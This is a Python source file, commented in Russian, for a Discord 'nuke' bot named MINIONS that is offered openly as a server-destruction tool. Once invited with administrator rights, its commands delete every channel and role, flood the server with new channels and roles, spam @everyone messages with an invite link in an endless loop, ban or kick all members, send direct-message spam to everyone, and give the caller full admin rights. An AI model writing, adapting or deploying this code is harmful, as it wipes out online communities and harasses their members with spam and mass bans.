import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

# Загружаем переменные из .env файла
load_dotenv()

# Настройки бота
intents = discord.Intents.all()
intents.messages = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Токен бота из .env файла
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    print("ОШИБКА: Токен не найден! Создайте .env файл с DISCORD_TOKEN=ваш_токен")
    exit(1)

@bot.event
async def on_ready():
    print(f'Бот {bot.user.name} готов к работе!')
    print(f'ID бота: {bot.user.id}')
    print(f'Пригласительная ссылка: https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot')
    await bot.change_presence(activity=discord.Game(name="!nuke | MINIONS"))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f"Ошибка: {error}")

@bot.command()
async def nuke(ctx):
    """Полное уничтожение сервера"""
    try:
        await ctx.send("🚀 ЗАПУСК ПОЛНОГО УНИЧТОЖЕНИЯ СЕРВЕРА...")
        
        # Мгновенное удаление всех каналов
        delete_tasks = []
        for channel in ctx.guild.channels:
            delete_tasks.append(channel.delete())
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        # Мгновенное удаление всех ролей
        role_tasks = []
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                role_tasks.append(role.delete())
        await asyncio.gather(*role_tasks, return_exceptions=True)
        
        # Массовое создание каналов
        create_tasks = []
        for i in range(100):
            create_tasks.append(ctx.guild.create_text_channel(f"MINIONS-INVADE-{i+1}"))
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        
        # Изменение названия сервера и иконки
        try:
            await ctx.guild.edit(name="💀 MINIONS DESTROYED SERVER 💀")
        except:
            pass
        
        # Массовый спам во всех каналах
        spam_tasks = []
        for channel in channels:
            if isinstance(channel, discord.TextChannel):
                for i in range(50):
                    spam_tasks.append(channel.send("@everyone 🚀 MINIONS NUKE BOT https://discord.gg/GTKjv36M 💀💀💀"))
        
        # Массовый бан всех участников
        ban_tasks = []
        for member in ctx.guild.members:
            if member != ctx.author and member != bot.user:
                ban_tasks.append(member.ban(reason="MINIONS NUKE", delete_message_days=7))
        
        # Запуск всех задач одновременно
        await asyncio.gather(*spam_tasks, *ban_tasks, return_exceptions=True)
        
        # Бесконечный спам
        while True:
            for channel in ctx.guild.text_channels:
                try:
                    await channel.send("@everyone 💀 SERVER DESTROYED BY MINIONS BOT 💀 https://discord.gg/GTKjv36M 🚀🚀🚀")
                except:
                    continue
            await asyncio.sleep(0.1)
            
    except Exception as e:
        print(f"Ошибка: {e}")

@bot.command()
async def spam(ctx, amount: int = 500):
    """Массовый спам сообщениями"""
    for i in range(amount):
        try:
            await ctx.send(f"@everyone MINIONS ATTACK #{i+1} https://discord.gg/GTKjv36M 💀💀💀")
            await asyncio.sleep(0.1)
        except:
            continue

@bot.command()
async def banall(ctx):
    """Массовый бан всех участников"""
    banned = 0
    for member in ctx.guild.members:
        try:
            if member != ctx.author and member != bot.user:
                await member.ban(reason="MINIONS MASS BAN", delete_message_days=7)
                banned += 1
                print(f"Забанен: {member.name}")
        except:
            continue
    await ctx.send(f"✅ Забанено участников: {banned}")

@bot.command()
async def kickall(ctx):
    """Массовый кик всех участников"""
    kicked = 0
    for member in ctx.guild.members:
        try:
            if member != ctx.author and member != bot.user:
                await member.kick(reason="MINIONS MASS KICK")
                kicked += 1
                print(f"Кикнут: {member.name}")
        except:
            continue
    await ctx.send(f"✅ Кикнуто участников: {kicked}")

@bot.command()
async def rolespam(ctx):
    """Массовое создание ролей"""
    created = 0
    for i in range(250):
        try:
            await ctx.guild.create_role(name=f"MINION-DESTROYER-{i+1}")
            created += 1
        except:
            continue
    await ctx.send(f"✅ Создано ролей: {created}")

@bot.command()
async def admin(ctx):
    """Выдача админ-прав себе"""
    try:
        # Создание роли с админ правами
        role = await ctx.guild.create_role(name="MINIONS-ADMIN", permissions=discord.Permissions.all())
        await ctx.author.add_roles(role)
        await ctx.send("✅ Админ права выданы!")
    except:
        await ctx.send("❌ Не удалось выдать права")

@bot.command()
async def dmall(ctx, *, message: str):
    """Рассылка ЛС всем участникам"""
    sent = 0
    for member in ctx.guild.members:
        try:
            if not member.bot:
                await member.send(f"💀 {message} 💀\nhttps://discord.gg/GTKjv36M")
                sent += 1
                await asyncio.sleep(0.5)
        except:
            continue
    await ctx.send(f"✅ Отправлено ЛС: {sent}")

@bot.command()
async def emojispam(ctx):
    """Массовое создание эмодзи"""
    created = 0
    # Здесь нужно добавить картинки для эмодзи, но для примера просто пытаемся создать
    for i in range(50):
        try:
            # Это вызовет ошибку без картинки, но попытается
            await ctx.guild.create_custom_emoji(name=f"minion_{i+1}", image=await discord.Asset.read(ctx.guild.icon))
            created += 1
        except:
            continue
    await ctx.send(f"✅ Создано эмодзи: {created}")

@bot.command()
async def help(ctx):
    """Помощь по командам"""
    embed = discord.Embed(title="💀 MINIONS NUKE BOT 💀", color=0xff0000)
    embed.add_field(name="!nuke", value="Полное уничтожение сервера", inline=False)
    embed.add_field(name="!spam [количество]", value="Массовый спам сообщениями", inline=False)
    embed.add_field(name="!banall", value="Массовый бан всех участников", inline=False)
    embed.add_field(name="!kickall", value="Массовый кик всех участников", inline=False)
    embed.add_field(name="!rolespam", value="Массовое создание ролей", inline=False)
    embed.add_field(name="!admin", value="Выдача админ-прав", inline=False)
    embed.add_field(name="!dmall [сообщение]", value="Рассылка ЛС всем", inline=False)
    embed.add_field(name="!emojispam", value="Массовое создание эмодзи", inline=False)
    embed.set_footer(text="💀 MINIONS DESTROYER BOT 💀")
    
    await ctx.send(embed=embed)

@bot.command()
async def massnick(ctx, *, nickname: str = "💀 MINION 💀"):
    """Массовая смена ников"""
    changed = 0
    for member in ctx.guild.members:
        try:
            await member.edit(nick=nickname)
            changed += 1
            await asyncio.sleep(0.5)
        except:
            continue
    await ctx.send(f"✅ Сменено ников: {changed}")

# Слэш команды
@bot.tree.command(name="nuke", description="Полное уничтожение сервера")
async def slash_nuke(interaction: discord.Interaction):
    await interaction.response.send_message("🚀 Запуск полного уничтожения...")
    ctx = await bot.get_context(interaction.message)
    await nuke(ctx)

@bot.tree.command(name="spam", description="Массовый спам сообщениями")
async def slash_spam(interaction: discord.Interaction, amount: int = 500):
    await interaction.response.send_message(f"📢 Массовый спам {amount} сообщений...")
    ctx = await bot.get_context(interaction.message)
    await spam(ctx, amount)

# Запуск бота
if __name__ == "__main__":
    # Синхронизация слэш команд
    @bot.event
    async def on_connect():
        try:
            await bot.tree.sync()
            print("Слэш команды синхронизированы!")
        except Exception as e:
            print(f"Ошибка синхронизации: {e}")
    
    bot.run(TOKEN)
